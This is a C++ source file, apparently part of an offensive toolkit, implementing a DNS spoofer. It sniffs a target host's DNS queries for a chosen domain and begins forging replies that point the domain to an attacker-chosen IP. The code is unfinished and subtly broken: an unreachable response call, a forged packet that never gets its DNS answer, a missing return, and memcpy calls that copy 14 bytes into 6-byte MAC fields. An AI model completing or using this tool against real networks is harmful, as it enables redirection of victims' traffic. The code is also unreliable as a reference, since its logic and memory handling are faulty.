#include "DNSSpoofer.h"

#include <iostream>

#include <cstring>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ip.h>

CHaks::DNSSpoofer::DNSSpoofer()
{

}

CHaks::DNSSpoofer::~DNSSpoofer()
{
    
}

int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targetIP, char* domain, char* fakeDomainIP)
{
    // filter for the correct DNS request by the targetIP
    while(true)
    {
        PacketCraft::Packet packet;
        if(packet.Receive(socketFd, 0) == APPLICATION_ERROR)
            continue;

        DNSHeader* dnsHeader = (DNSHeader*)packet.FindLayerByType(PC_DNS);
        if(dnsHeader != nullptr && dnsHeader->qr == 0) // check that this is a dns query not a response
        {
            std::cout << "DNS packet found\n";

            // check the ip version of the packet
            EthHeader* ethHeader = (EthHeader*)packet.GetLayerStart(0);
            if(ethHeader->ether_type == htons(ETH_P_IP))
            {
                sockaddr_in targetIPAddr{};
                inet_pton(AF_INET, targetIP, &targetIPAddr.sin_addr);

                IPv4Header* ipv4Header = (IPv4Header*)packet.GetLayerStart(1);
                if(targetIPAddr.sin_addr.s_addr == ipv4Header->ip_src.s_addr)
                {
                    dnsParser.Parse(*dnsHeader);

                    for(unsigned int i = 0; i < dnsParser.nQuestions; ++i)
                    {
                        if((PacketCraft::FindInStr(dnsParser.questionsArray[i].qName, domain) != -1) && dnsParser.questionsArray[i].qType == 1)
                        {
                            std::cout << "dns request matching ip, qtype and domain found:" << std::endl;
                            packet.Print();
                            continue;

                            PacketCraft::Packet dnsResponse;
                            CreateFakeDNSResponse(socketFd, interfaceName, packet, dnsResponse, fakeDomainIP, dnsParser.questionsArray[i]);
                        }
                    }
                }

                continue;
            }
            else if(ethHeader->ether_type == htons(ETH_P_IPV6)) // TODO: make sure ipv6 processing code below works
            {
                sockaddr_in6 targetIPAddr{};
                inet_pton(AF_INET6, targetIP, &targetIPAddr.sin6_addr);

                IPv6Header* ipv6Header = (IPv6Header*)packet.GetLayerStart(1);
                if(memcmp(targetIPAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, 16) == 0)
                {
                    std::cout << "Matching IPv6 found in DNS packet\n";
                    packet.Print();
                }

                continue;
            }
        }

        std::cout << "packet was not DNS" << std::endl;
    }
}

int CHaks::DNSSpoofer::CreateFakeDNSResponse(int socketFd, const char* interfaceName, PacketCraft::Packet& dnsRequestPacket,
    PacketCraft::Packet& dnsResponsePacket, char* fakeDomainIP, const PacketCraft::DNSQuestion& question)
{
    EthHeader* dnsRequestEthHeader = (EthHeader*)dnsRequestPacket.FindLayerByType(PC_ETHER_II);
    dnsResponsePacket.AddLayer(PC_ETHER_II, ETH_HLEN);
    EthHeader* dnsResponseEthHeader = (EthHeader*)dnsResponsePacket.GetLayerStart(0);

    memcpy(dnsResponseEthHeader->ether_dhost, dnsRequestEthHeader->ether_shost, ETH_HLEN);
    memcpy(dnsResponseEthHeader->ether_shost, dnsRequestEthHeader->ether_dhost, ETH_HLEN);
    dnsResponseEthHeader->ether_type = dnsRequestEthHeader->ether_type;

    if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IP)
    {
        IPv4Header* dnsRequestIPv4Header = (IPv4Header*)dnsRequestPacket.FindLayerByType(PC_IPV4);
        dnsResponsePacket.AddLayer(PC_IPV4, sizeof(IPv4Header));
        IPv4Header* dnsResponseIPv4Header = (IPv4Header*)dnsResponsePacket.GetLayerStart(1);

        dnsResponseIPv4Header->ip_hl = sizeof(*dnsRequestIPv4Header) * 8 / 32;
        dnsResponseIPv4Header->ip_v = IPVERSION;                       
        dnsResponseIPv4Header->ip_tos = IPTOS_CLASS_CS0;
        dnsResponseIPv4Header->ip_len = 0; // calculated later
        dnsResponseIPv4Header->ip_id = dnsRequestIPv4Header->ip_id;
        dnsResponseIPv4Header->ip_off = htons(IP_DF);
        dnsResponseIPv4Header->ip_ttl = IPDEFTTL;
        dnsResponseIPv4Header->ip_p = dnsRequestIPv4Header->ip_p;
        dnsResponseIPv4Header->ip_sum = htons(0); // calculated later
        dnsResponseIPv4Header->ip_dst.s_addr = dnsRequestIPv4Header->ip_src.s_addr;
        dnsResponseIPv4Header->ip_src.s_addr = dnsRequestIPv4Header->ip_dst.s_addr;

        if(dnsResponseIPv4Header->ip_p == IPPROTO_UDP)
        {
            UDPHeader* dnsRequestUDPHeader = (UDPHeader*)dnsRequestPacket.FindLayerByType(PC_UDP);
            dnsResponsePacket.AddLayer(PC_UDP, sizeof(UDPHeader));
            UDPHeader* dnsResponseUDPHeader = (UDPHeader*)dnsResponsePacket.GetLayerStart(2);

            dnsResponseUDPHeader->source = dnsRequestUDPHeader->dest;
            dnsResponseUDPHeader->dest = dnsRequestUDPHeader->source;
            dnsResponseUDPHeader->check = 0; // calculated later
            dnsResponseUDPHeader->len = 0; // calculated later

            // finally add DNS layer
            DNSHeader* dnsRequestDNSHeader = (DNSHeader*)dnsRequestPacket.FindLayerByType(PC_DNS);


            
        }
        else if(dnsResponseIPv4Header->ip_p == IPPROTO_TCP)
        {
            // TODO: support for dns over tcp, and possibly others
            LOG_ERROR(APPLICATION_ERROR, "dns over tcp not supported!");
            return APPLICATION_ERROR;
        }
    }
    else if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IPV6)
    {
        // TODO: support for ipv6
        LOG_ERROR(APPLICATION_ERROR, "ipv6 not supported!");
        return APPLICATION_ERROR;
    }



    
}